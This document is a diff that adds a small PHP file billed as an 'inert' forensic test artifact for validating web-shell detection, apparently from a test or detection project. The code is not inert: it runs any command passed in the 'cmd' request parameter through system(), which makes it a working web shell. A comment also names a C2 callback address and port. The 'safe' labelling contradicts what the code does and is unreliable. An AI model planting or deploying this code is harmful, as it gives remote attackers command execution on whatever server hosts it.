@@ -1,0 +1,11 @@
+<?php
+// CyberTrace Sample Inert Forensic Test Artifact
+// Safe test string imitating web shell signature for detection validation
+if(isset($_REQUEST['cmd'])){
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "<pre>Executed command via test backdoor stub</pre>";
+    // C2 callback simulation: 198.51.100.99:4444
+}
+?>
+
